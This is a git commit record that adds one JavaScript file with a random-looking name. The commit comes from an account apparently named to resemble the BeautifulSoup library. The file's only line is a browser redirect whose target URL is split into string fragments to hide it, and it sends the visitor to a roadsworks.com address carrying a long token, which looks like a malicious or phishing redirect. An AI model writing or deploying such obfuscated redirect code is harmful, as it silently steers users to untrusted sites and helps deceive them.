4e62a705dad3cfed625fd3c515de95ad95b0efc2
beautifulsoupz <77855946+beatifulsoup@users.noreply.github.com>
2022-12-22 18:09:03 +0100

    Create ghfhvhhvjhgvhbvhjthfchrcucjhcjcychtjytuytuyhg.js

---
+++ ghfhvhhvjhgvhbvhjthfchrcucjhcjcychtjytuytuyhg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/www.r`,`oadswo`,`rks.com/V0p`,`0l`,`jJEcXBBoh`,`1Zf2-7c6`,`Ntbr`,`Jwk7`,`m`,`qx2xM8Fs`,`UxZ6UUS`,`4bQWm6AGSrXk`,`ROfcztu4`,`MhdFyXh1fRk`,`e_qYnR`,`ffA~~/u035RkcxyMZ`))
